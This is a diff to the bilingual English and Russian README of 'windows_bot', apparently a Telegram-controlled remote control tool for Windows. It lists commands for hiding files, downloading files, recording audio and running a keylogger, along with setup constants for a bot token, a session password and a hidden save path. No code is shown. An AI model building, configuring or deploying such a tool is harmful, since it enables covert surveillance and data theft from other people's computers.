@@ -31,7 +31,6 @@ File System Commands
     pwd                       Get working directory
     cd                        Change directory         
     ls                        Get information about files or dirs in working directory    
-    cat                       Get file contents
     mkfile                    Create file               
     mkdir                     Create dir              
     rn                        Rename file or dir
@@ -41,7 +40,7 @@ File System Commands
     mv                        Move file or dir
     hide                      Hide file or dir 
     unhide                    Unhide file or dir                        
-    download                  Download file
+    cat                       Download file
     zip                       Make archive current directory
                  
                  
@@ -104,7 +103,7 @@ User Interface Commands
     audio                     Record audio or play audio 
     img                       Display image
     msg                       Display message                     
-    keylogger                 Keylogger utilities   
+    keylogger                 Keylogger utilities     
 ```
 
 
@@ -136,7 +135,7 @@ git clone https://github.com/cppandpython/windows_bot.git
 # Change consts ​​in bot.py
 TOKEN = TELEGRAM BOT TOKEN
 PASSWORD = PASSWORD FOR SESSION WITH TELEGRAM BOT
-SEED = TELEGRAM BOT ENCRYPTION ACCEPTABLE VALUE TYPE int  
+SEED = ACCEPTABLE VALUE TYPE int # RESPONSIBLE FOR ENCRYPTION INITIAL VALUES  
 PATH = PATH TO SAVE TELEGRAM BOT
 
 BOT_FILE_NAME = HOW TO SAVE TELEGRAM BOT NAME IN PATH
@@ -178,7 +177,7 @@ git clone https://github.com/cppandpython/windows_bot.git
 # Изменить константы в bot.py
 TOKEN = ТОКЕН TELEGRAM-БОТА
 PASSWORD = ПАРОЛЬ ДЛЯ СЕССИИ С TELEGRAM-БОТОМ
-SEED = ДОПУСТИМОЕ ЗНАЧЕНИЕ ШИФРОВАНИЯ TELEGRAM-БОТА ТИПА INT  
+SEED = ДОПУСТИМОЕ ЗНАЧЕНИЕ ШИФРОВАНИЯ TELEGRAM-БОТА ТИП int # ОТВЕТСТВЕННЫЙ ЗА НАЧАЛЬНЫЕ ЗНАЧЕНИЯ ШИФРОВАНИЯ  
 PATH = ПУТЬ ДЛЯ СОХРАНЕНИЯ TELEGRAM-БОТА
 
 BOT_FILE_NAME = ИМЯ ФАЙЛА TELEGRAM-БОТА ДЛЯ СОХРАНЕНИЯ В PATH
